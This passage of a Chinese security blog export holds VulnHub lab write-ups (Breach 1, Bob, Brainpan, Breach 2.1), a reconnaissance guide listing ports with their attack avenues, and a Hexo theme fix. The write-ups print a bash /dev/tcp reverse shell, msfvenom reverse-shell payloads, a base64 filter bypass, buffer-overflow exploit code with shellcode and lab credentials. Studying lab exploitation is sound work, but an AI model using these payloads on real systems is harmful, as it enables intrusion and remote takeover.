<p><img src="/images/Breach-1/6.jpg" alt="6"></p>
<p>发现了一个登录页面，尝试之前发现的账户密码</p>
<p>账号:pgibbons</p>
<p>密码:damnitfeel$goodtobeagang$ta</p>
<p><img src="/images/Breach-1/4.jpg" alt="4"></p>
<p>成功登录，左侧发现有3封邮件可以查看</p>
<p>第一封提示 Bill有一个非常安全的密码<br>第二封提示 机器上存在IDS/IPS<br>第三封提示 一个密钥文件在<code>192.168.110.140/.keystore</code></p>
<p>之后我又在主页面发现了一个SSL测试数据包</p>
<p><img src="/images/Breach-1/7.jpg" alt="7"></p>
<p>接着</p>
<p><img src="/images/Breach-1/8.jpg" alt="8"></p>
<p>而且该页面还提示<code>the alias, storepassword and keypassword are all set to &#39;tomcat&#39;</code></p>
<p>之后使用wireshark查看pcap包，内容全都被加密了，不过可以发现，大多数包都是走的8433端口</p>
<p><img src="/images/Breach-1/10.jpg" alt="10"></p>
<h3 id="keytool导出SSL证书"><a href="#keytool导出SSL证书" class="headerlink" title="keytool导出SSL证书"></a>keytool导出SSL证书</h3><p>想到之前的keystore文件，keytool的基本用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令:</span><br><span class="line"> -certreq            生成证书请求</span><br><span class="line"> -changealias        更改条目的别名</span><br><span class="line"> -delete             删除条目</span><br><span class="line"> -exportcert         导出证书</span><br><span class="line"> -genkeypair         生成密钥对</span><br><span class="line"> -genseckey          生成密钥</span><br><span class="line"> -gencert            根据证书请求生成证书</span><br><span class="line"> -importcert         导入证书或证书链</span><br><span class="line"> -importpass         导入口令</span><br><span class="line"> -importkeystore     从其他密钥库导入一个或所有条目</span><br><span class="line"> -keypasswd          更改条目的密钥口令</span><br><span class="line"> -list               列出密钥库中的条目</span><br><span class="line"> -printcert          打印证书内容</span><br><span class="line"> -printcertreq       打印证书请求的内容</span><br><span class="line"> -printcrl           打印 CRL 文件的内容</span><br><span class="line"> -storepasswd        更改密钥库的存储口令</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-1/9.jpg" alt="9"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</span><br><span class="line">-importkeystore    		从其他密钥库导入一个或所有条目</span><br><span class="line">-srckeystore          	源keystore文件</span><br><span class="line">-destkeystore         	新keystore文件</span><br><span class="line">-deststoretype       	证书格式</span><br><span class="line">-srcalias 	            源实体别名</span><br></pre></td></tr></table></figure>

<p>之后点击Edit→Preferences→Protocols→TLS</p>
<p><img src="/images/Breach-1/11.jpg" alt="11"></p>
<p>我们成功解密了HTTPS数据包</p>
<p><img src="/images/Breach-1/12.jpg" alt="12"></p>
<p>之后在数据包寻找线索</p>
<p><img src="/images/Breach-1/13.jpg" alt="13"></p>
<p>在数据包18中发现了疑似后台登录页面<code>/_M@nag3Me/html</code><br>找到了加密后的登录凭据<code>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code></p>
<p><img src="/images/Breach-1/14.jpg" alt="14"></p>
<p>解密后tomcat:Tt\5D8F(#!*u=G)4m7zB</p>
<p>登录后台地址<code>https://192.168.110.140:8443/_M@nag3Me/html</code>，挂着burpsuite解决证书问题</p>
<p><img src="/images/Breach-1/15.jpg" alt="15"></p>
<p>输入账户密码</p>
<p><img src="/images/Breach-1/16.jpg" alt="16"></p>
<p>终于进入了后台</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="上传Getshell"><a href="#上传Getshell" class="headerlink" title="上传Getshell"></a>上传Getshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;4444 -f war -o &#x2F;root&#x2F;Desktop&#x2F;evil.war</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-1/17.jpg" alt="17"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="dirtycow"><a href="#dirtycow" class="headerlink" title="dirtycow"></a>dirtycow</h3><p>直接使用脏牛提权</p>
<p><a href="https://github.com/exrienz/DirtyCow">https://github.com/exrienz/DirtyCow</a></p>
<p><img src="/images/Breach-1/18.jpg" alt="18"></p>
<h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><p>网上找到的，测试之后也是可以的，不过也太绕了</p>
<p><a href="https://www.freebuf.com/articles/system/171318.html">链接</a></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>初步信息收集</title>
    <url>/2019/05/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h1><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p>可收集网络注册信息、注册的域名、IP地址等信息</p>
<a id="more"></a>

<p>注册人姓名、邮箱信息对个人站点非常有用，可挖掘更多信息<br><img src="/images/1.jpg" alt=""></p>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>ICP备案查询和天眼查</p>
<h2 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h2><p>GHDB</p>
<table>
<thead>
<tr>
<th align="left">关键字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">site</td>
<td align="left">指定域名</td>
</tr>
<tr>
<td align="left">inurl</td>
<td align="left">URL中存在关键字的网页</td>
</tr>
<tr>
<td align="left">intext</td>
<td align="left">网页正文中的关键字</td>
</tr>
<tr>
<td align="left">filetype</td>
<td align="left">指定文件类型</td>
</tr>
<tr>
<td align="left">intitle</td>
<td align="left">网页标题中的关键字</td>
</tr>
<tr>
<td align="left">link</td>
<td align="left">返回所有和输入域名做了链接的URL</td>
</tr>
<tr>
<td align="left">info</td>
<td align="left">查找指定站点基本信息</td>
</tr>
<tr>
<td align="left">cache</td>
<td align="left">搜索Google里关于某些内容的缓存</td>
</tr>
<tr>
<td align="left">例如:</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><img src="/images/2.jpg" alt=""></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Burpsuite Repeater模块</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">可以收集运行Server的类型及版本、PHP版本信息等</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><img src="/images/3.jpg" alt=""></td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>我们可以在Google搜索中使用“site：”运算符来查找Google为域找到的所有子域。谷歌还支持额外的减号运算符，以排除我们对不感兴趣的子域名<br>site：*.wikimedia.org -www -store -jobs -uk</p>
<p>工具:Layer5.0修改版、subDomainBrute、Sublist3r、subdomainsniper</p>
<p>第三方DNS数据聚合<br><a href="https://www.virustotal.com/">https://www.virustotal.com</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<p>证书透明度公开日志枚举<br><a href="https://crt.sh/">https://crt.sh</a><br><a href="https://censys.io/">https://censys.io</a></p>
<p>在线子域名爆破<br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>IP反查绑定域名<br><a href="https://dns.aizhan.com/">https://dns.aizhan.com</a></p>
<h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h2><p>Nmap、御剑</p>
<p>常用端口及攻击方法</p>
<h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">21/22/69</td>
<td align="left">Ftp/Tftp文件传输协议</td>
<td align="left">允许匿名的上传、下载、爆破或嗅探操作</td>
</tr>
<tr>
<td align="left">2049</td>
<td align="left">Nfs服务</td>
<td align="left">配置不当</td>
</tr>
<tr>
<td align="left">139</td>
<td align="left">Samba服务</td>
<td align="left">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td align="left">389</td>
<td align="left">Ldap</td>
<td align="left">注入、允许匿名访问、弱口令</td>
</tr>
</tbody></table>
<h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">22</td>
<td align="left">SSH远程连接</td>
<td align="left">爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td align="left">23</td>
<td align="left">Telnet远程连接</td>
<td align="left">爆破、嗅探、弱口令</td>
</tr>
<tr>
<td align="left">3389</td>
<td align="left">Rdp远程桌面连接</td>
<td align="left">Shift后门(WinServer2003及以下系统)、爆破</td>
</tr>
<tr>
<td align="left">5900</td>
<td align="left">VNC</td>
<td align="left">弱口令爆破</td>
</tr>
<tr>
<td align="left">5632</td>
<td align="left">PyAnywhere服务</td>
<td align="left">抓密码、代码执行</td>
</tr>
</tbody></table>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">80/443/8080</td>
<td align="left">常见Web服务端口</td>
<td align="left">Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td align="left">7001/7002</td>
<td align="left">WebLogic控制台</td>
<td align="left">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="left">8080/8089</td>
<td align="left">Jboss/Resin/Jetty/Jenkins</td>
<td align="left">反序列化、控制台弱口令</td>
</tr>
<tr>
<td align="left">9090</td>
<td align="left">WebSphere控制台</td>
<td align="left">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="left">4848</td>
<td align="left">GlassFish控制台</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td align="left">1352</td>
<td align="left">Lotus domino邮件服务</td>
<td align="left">弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td align="left">10000</td>
<td align="left">Webmin-Web控制面板</td>
<td align="left">弱口令</td>
</tr>
</tbody></table>
<h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">3306</td>
<td align="left">MySQL</td>
<td align="left">注入、提权、爆破</td>
</tr>
<tr>
<td align="left">1433</td>
<td align="left">MSSQL</td>
<td align="left">注入、提权、SA弱口令</td>
</tr>
<tr>
<td align="left">1521</td>
<td align="left">Oracle</td>
<td align="left">TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td align="left">5432</td>
<td align="left">PostgreSQL</td>
<td align="left">爆破、注入、弱口令</td>
</tr>
<tr>
<td align="left">27017/27018</td>
<td align="left">MongoDB</td>
<td align="left">爆破、未授权访问</td>
</tr>
<tr>
<td align="left">6379</td>
<td align="left">Redis</td>
<td align="left">可尝试未授权访问、弱口令爆破</td>
</tr>
<tr>
<td align="left">5000</td>
<td align="left">SysBase/DB2</td>
<td align="left">爆破、注入</td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">25</td>
<td align="left">SMTP邮件服务</td>
<td align="left">邮件伪造</td>
</tr>
<tr>
<td align="left">110</td>
<td align="left">POP3协议</td>
<td align="left">爆破、嗅探</td>
</tr>
<tr>
<td align="left">143</td>
<td align="left">IMAP协议</td>
<td align="left">爆破</td>
</tr>
</tbody></table>
<h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">53</td>
<td align="left">DNS域名系统</td>
<td align="left">允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td align="left">67/68</td>
<td align="left">DHCP服务</td>
<td align="left">劫持、欺骗</td>
</tr>
<tr>
<td align="left">161</td>
<td align="left">SNMP协议</td>
<td align="left">爆破、搜集目标内网信息</td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2181</td>
<td align="left">Zookpper</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td align="left">8069</td>
<td align="left">Zabbix</td>
<td align="left">远程执行、SQL注入</td>
</tr>
<tr>
<td align="left">9200/9300</td>
<td align="left">Elasticsearch</td>
<td align="left">远程执行</td>
</tr>
<tr>
<td align="left">11211</td>
<td align="left">Memcache</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td align="left">512/513/514</td>
<td align="left">Linux Rexec</td>
<td align="left">爆破、Rlogin登录</td>
</tr>
<tr>
<td align="left">873</td>
<td align="left">Rsync</td>
<td align="left">匿名访问、文件上传</td>
</tr>
<tr>
<td align="left">3690</td>
<td align="left">Svn服务</td>
<td align="left">Svn泄露、未授权访问</td>
</tr>
<tr>
<td align="left">50000</td>
<td align="left">SAP Management Console</td>
<td align="left">远程执行</td>
</tr>
</tbody></table>
<img src="/images/Port.jpg">

<h2 id="网站CMS指纹识别"><a href="#网站CMS指纹识别" class="headerlink" title="网站CMS指纹识别"></a>网站CMS指纹识别</h2><p>通过某些特性，识别网站CMS，查找相应漏洞<br><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br><a href="https://www.whatweb.net/">https://www.whatweb.net/</a></p>
<h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><h3 id="判断是否使用CDN"><a href="#判断是否使用CDN" class="headerlink" title="判断是否使用CDN"></a>判断是否使用CDN</h3><p>使用Ping目标主域，观察解析情况</p>
<p>进行全国多地区Ping<br><a href="https://www.17ce.com/">https://www.17ce.com/</a></p>
<h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><p>一般邮件系统在内部，未经过CDN解析，可以Ping邮件服务器的域名<br>扫描网站测试文件，如phpinfo，从而找到真实IP<br>扫描分站域名。主站访问量大会挂CDN，分站可能没挂，可以Ping二级域名获取分站IP。<br>国外访问。国内CDN一般只对国内用户的访问加速 <a href="https://asm.ca.com/zh_cn/ping.php">https://asm.ca.com/zh_cn/ping.php</a><br>查询域名解析记录。也许目标之前未使用CDN，可以通过NETCRAFT来观察域名IP历史记录<br>如果网站有自己的APP，可以尝试抓取APP的请求，找到真实IP</p>
<h3 id="敏感文件收集"><a href="#敏感文件收集" class="headerlink" title="敏感文件收集"></a>敏感文件收集</h3><p>探测Web目录结构和隐藏敏感文件，从而获取网站后台管理页面、文件上传页面，甚至扫描出网站源代码<br>工具:DirBuster、御剑后台扫描、wwwscan、Spinder.py、Sensitivefilescan、Weakfilescan</p>
<p>Github信息泄露</p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title>hexo&amp;next的常见配置问题</title>
    <url>/2020/11/19/hexo-next%E7%9A%84%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>持续记录hexo或next主题一些可能遇到的错误</p>
<h2 id="锚点问题"><a href="#锚点问题" class="headerlink" title="锚点问题"></a>锚点问题</h2><p>页面左侧的中文标题锚点出现问题</p>
<p><img src="/images/Hexo&Next/1.png" alt="1"></p>
<p>编码问题，修改<code>\themes\next\source\js\utils.js</code>修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">registerSidebarTOC: function() &#123;</span><br><span class="line">  const navItems &#x3D; document.querySelectorAll(&#39;.post-toc li&#39;);</span><br><span class="line">  const sections &#x3D; [...navItems].map(element &#x3D;&gt; &#123;</span><br><span class="line">    var link &#x3D; element.querySelector(&#39;a.nav-link&#39;);</span><br><span class="line">    &#x2F;&#x2F; TOC item animation navigate.</span><br><span class="line">    link.addEventListener(&#39;click&#39;, event &#x3D;&gt; &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">      var target &#x3D; document.getElementById(event.currentTarget.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;));</span><br><span class="line">      var offset &#x3D; target.getBoundingClientRect().top + window.scrollY;</span><br><span class="line">      window.anime(&#123;</span><br><span class="line">        targets  : document.scrollingElement,</span><br><span class="line">        duration : 500,</span><br><span class="line">        easing   : &#39;linear&#39;,</span><br><span class="line">        scrollTop: offset + 10</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    return document.getElementById(link.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>添加decodeURI()，修改如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">registerSidebarTOC: function() &#123;</span><br><span class="line">  const navItems &#x3D; document.querySelectorAll(&#39;.post-toc li&#39;);</span><br><span class="line">  const sections &#x3D; [...navItems].map(element &#x3D;&gt; &#123;</span><br><span class="line">    var link &#x3D; element.querySelector(&#39;a.nav-link&#39;);</span><br><span class="line">    &#x2F;&#x2F; TOC item animation navigate.</span><br><span class="line">    link.addEventListener(&#39;click&#39;, event &#x3D;&gt; &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">      var target &#x3D; document.getElementById(decodeURI(event.currentTarget.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;)));</span><br><span class="line">      var offset &#x3D; target.getBoundingClientRect().top + window.scrollY;</span><br><span class="line">      window.anime(&#123;</span><br><span class="line">        targets  : document.scrollingElement,</span><br><span class="line">        duration : 500,</span><br><span class="line">        easing   : &#39;linear&#39;,</span><br><span class="line">        scrollTop: offset + 10</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    return document.getElementById(decodeURI(link.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;)));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>靶场Bob 1.0.1</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BABob-1-0-1/</url>
    <content><![CDATA[<h1 id="Bob-1-0-1"><a href="#Bob-1-0-1" class="headerlink" title="Bob 1.0.1"></a>Bob 1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.229</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.229 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.229 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Bob-1-0-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>nikto扫描</p>
<p><img src="/images/Bob-1-0-1/2.png" alt="2"></p>
<p>发现了robots.txt</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在robots.txt 提示的页面发现了命令执行</p>
<p><img src="/images/Bob-1-0-1/3.png" alt="3"></p>
<p>不过有些限制</p>
<p><img src="/images/Bob-1-0-1/4.png" alt="4"></p>
<p>看来ls执行不了，尝试<code>\l\s</code>或者<code>lsattr</code>都是可以执行的，这里有很多方法都可以绕，比如<code>echo bHM= |base64 -d |bash</code></p>
<p><img src="/images/Bob-1-0-1/5.png" alt="5"></p>
<p>接着找到了.bak备份文件</p>
<p><img src="/images/Bob-1-0-1/6.png" alt="6"></p>
<p><img src="/images/Bob-1-0-1/7.png" alt="7"></p>
<p>读取后发现就是一个黑名单的数组匹配，那连绕过都不用绕，直接payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bob-1-0-1/8.png" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先发现了sudo启动apache2和ssh的权限</p>
<p><img src="/images/Bob-1-0-1/9.png" alt="9"></p>
<p>这个应该不能用于提权</p>
<p><img src="/images/Bob-1-0-1/10.png" alt="10"></p>
<p>仔细检查，在home目录里可以发现一些信息</p>
<p><img src="/images/Bob-1-0-1/11.png" alt="11"></p>
<p>可以发现seb和jc的凭据，可以切换过去，但并没有其他发现<br>手动检查一些目录，在/home/bob/Documents里发现了login.txt.gpg，一个加密后的文件，在这种较深的目录且文件名没有关键词，linpeas就很难发现</p>
<p><img src="/images/Bob-1-0-1/12.png" alt="12"></p>
<p>继续检查Secret目录，在/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here处发现了notes.sh</p>
<p><img src="/images/Bob-1-0-1/13.png" alt="13"></p>
<p>这里的首字母就是密钥了，用它来解密文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bob-1-0-1/14.png" alt="14"></p>
<p>这里好像缺少对home目录的写权限，可以换一个用户</p>
<p><img src="/images/Bob-1-0-1/15.png" alt="15"></p>
<p>或者传回到kali里，本地解密</p>
<p><img src="/images/Bob-1-0-1/16.png" alt="16"></p>
<p>这样就获得了bob的密码了</p>
<p><img src="/images/Bob-1-0-1/17.png" alt="17"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Brainpan</title>
    <url>/2020/10/30/%E9%9D%B6%E5%9C%BABrainpan/</url>
    <content><![CDATA[<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>一道非常简单的x86缓冲区溢出，基本就是oscp的内容，对方在10000端口放了.exe程序，放在x86的windows下进行调试，最后生成x86/linux的payload就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.2.3 LPORT&#x3D;4444 -f python -b &#39;\x00&#39; -v shellcode</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">  <span class="comment">#badchar=&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">  shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xdb\xc7\xba\x87\x2d\xc3\xaf\xd9\x74\x24\xf4&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x5b\x31\xc9\xb1\x12\x31\x53\x17\x83\xc3\x04&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x03\xd4\x3e\x21\x5a\xeb\x9b\x52\x46\x58\x5f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xce\xe3\x5c\xd6\x11\x43\x06\x25\x51\x37\x9f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x05\x6d\xf5\x9f\x2f\xeb\xfc\xf7\x6f\xa3\xfd&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x04\x18\xb6\x01\x1b\x84\x3f\xe0\xab\x52\x10&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xb2\x98\x29\x93\xbd\xff\x83\x14\xef\x97\x75&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x3a\x63\x0f\xe2\x6b\xac\xad\x9b\xfa\x51\x63&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x0f\x74\x74\x33\xa4\x4b\xf7&quot;</span></span><br><span class="line">  buffer = <span class="string">&quot;A&quot;</span>*<span class="number">524</span>+<span class="string">&quot;\xf3\x12\x17\x31&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span></span><br><span class="line"> </span><br><span class="line">  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  </span><br><span class="line">  s.connect((<span class="string">&quot;192.168.2.179&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.send(buffer)</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.close()</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nDone!&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nCould not connect!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>也非常简单，发现sudo权限</p>
<p><img src="/images/brainpan/1.png" alt="1"></p>
<p>看来它能接受一些参数，按照它的语法输入whoami命令看看</p>
<p><img src="/images/brainpan/2.png" alt="2"></p>
<p>  之后的会话，看起来有点像 <code>|less</code>的情况，直接<code>!/bin/sh</code></p>
<p><img src="/images/brainpan/3.png" alt="3"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Breach 2.1</title>
    <url>/2020/09/21/%E9%9D%B6%E5%9C%BABreach-2-1/</url>
    <content><![CDATA[<h1 id="Breach-2-1"><a href="#Breach-2-1" class="headerlink" title="Breach 2.1"></a>Breach 2.1</h1><p>kali:192.168.110.128<br>目标:192.168.110.151</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sV -sC -p- 192.168.110.151 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Breach-2-1/1.png" alt="1"></p>
